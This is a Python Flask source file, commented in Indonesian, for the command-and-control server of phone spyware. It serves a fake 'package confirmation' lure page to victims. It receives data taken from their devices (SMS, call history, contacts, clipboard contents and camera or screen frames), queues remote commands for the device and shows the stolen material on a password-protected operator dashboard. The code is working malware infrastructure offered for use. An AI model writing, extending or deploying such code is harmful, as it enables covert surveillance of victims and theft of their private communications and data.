import os
import base64
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "GEAR99_LAB_EXCLUSIVE_SECRET_KEY_99"

# Kredensial Login Administrator Panel Operator
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

# =========================================================================
# GLOBAL STORAGE (Penyimpanan Data Riil di Memori Server VPS)
# =========================================================================
latest_frame = None
device_details = "MENUNGGU KONEKSI NODE..."
telemetry_logs = ["[SYSTEM] Central proxy automation secure channel online."]
pending_commands = []

# Tempat penampungan data asli yang disedot dari perangkat target
stolen_data = {
    "sms": [],
    "calls": [],
    "contacts": [],
    "apps": [],
    "clipboard": "Belum ada data papan klip.",
    "battery": "Unknown"
}

# --- 1. RUTE NAVIGASI HALAMAN (ROUTING) ---

@app.route('/')
def index():
    return render_template('landing.html')

@app.route('/konfirmasi-paket')
def target_page():
    return render_template('target.html')

@app.route('/operator/dashboard')
def operator_dashboard():
    if not session.get("logged_in"):
        return render_template('login.html')
    return render_template('operator.html')

@app.route('/login', methods=['POST'])
def login():
    if request.form.get("user") == USERNAME_ADMIN and request.form.get("pass") == PASSWORD_ADMIN:
        session["logged_in"] = True
        return redirect(url_for("operator_dashboard"))
    return "Otorisasi Gagal. <a href='/operator/dashboard'>Coba Lagi</a>"

@app.route('/logout')
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("operator_dashboard"))


# --- 2. ENDPOINT API UNTUK MEMPROSES DATA MASUK DARI KORBAN (INBOUND) ---

@app.route('/api/submit-telemetry', methods=['POST'])
def submit_telemetry():
    """
    Endpoint ini digunakan oleh HP target (file target.html / script korban)
    untuk mengirimkan hasil sedotan data asli ke server VPS Akang.
    """
    global device_details, telemetry_logs, stolen_data, latest_frame
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    # 1. Update Informasi Spesifikasi Perangkat Target
    if "device_info" in data:
        device_details = data["device_info"]
        telemetry_logs.append(f"[NODE_CONNECTED] Perangkat terdeteksi: {device_details}")

    # 2. Tampung Data SMS, Kontak, Panggilan, dll (Jika dikirim oleh payload)
    if "sms" in data:
        stolen_data["sms"] = data["sms"]
        telemetry_logs.append(f"[DATA_INJECT] Berhasil menyedot {len(data['sms'])} data SMS asli.")
        
    if "calls" in data:
        stolen_data["calls"] = data["calls"]
        telemetry_logs.append(f"[DATA_INJECT] Berhasil mengunduh {len(data['calls'])} riwayat panggilan.")
        
    if "contacts" in data:
        stolen_data["contacts"] = data["contacts"]
        telemetry_logs.append(f"[DATA_INJECT] Berhasil mengkloning {len(data['contacts'])} kontak.")

    if "clipboard" in data:
        stolen_data["clipboard"] = data["clipboard"]
        telemetry_logs.append("[DATA_INJECT] Data clipboard terbaru berhasil disalin.")

    if "battery" in data:
        stolen_data["battery"] = str(data["battery"]) + "%"

    # 3. Tampung Gambar Kamera / Screenshot (Base64)
    if "frame" in data:
        latest_frame = data["frame"]
        telemetry_logs.append("[MEDIA_CAPTURE] Frame visual terbaru berhasil diterima.")

    return jsonify({"status": "success", "commands": pending_commands})


# --- 3. ENDPOINT API UNTUK DASBOR OPERATOR (OUTBOUND) ---

@app.route('/api/execute-action', methods=['POST'])
def execute_action():
    """Menerima instruksi klik tombol dari dasbor hijau dan memasukkannya ke antrean perintah"""
    global pending_commands, telemetry_logs
    data = request.json
    if data and 'action' in data:
        action = data['action']
        pending_commands.append(action)
        telemetry_logs.append(f"[COMMAND_INJECT] Memicu utilitas {action.upper()}... Menunggu respon perangkat.")
        return jsonify({"status": "queued", "action": action})
    return jsonify({"status": "failed"}), 400

@app.route('/api/get-telemetry-log')
def get_telemetry_log():
    """Mengirimkan log telemetri aktual dan data yang berhasil disedot ke tampilan dasbor"""
    global telemetry_logs, device_details, stolen_data
    return jsonify({
        "details": device_details,
        "logs": telemetry_logs[-15:], # Batasi hanya 15 log terbaru agar tidak berat
        "stolen_data": stolen_data     # Mengirimkan data asli ke frontend
    })

@app.route('/api/get-latest-frame')
def get_latest_frame():
    """Mengubah kiriman foto Base64 menjadi file gambar riil untuk element <img src>"""
    global latest_frame
    if latest_frame:
        try:
            if "," in latest_frame:
                header, encoded = latest_frame.split(",", 1)
            else:
                encoded = latest_frame
            image_data = base64.b64decode(encoded)
            return image_data, 200, {'Content-Type': 'image/jpeg'}
        except Exception:
            return "", 204
    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
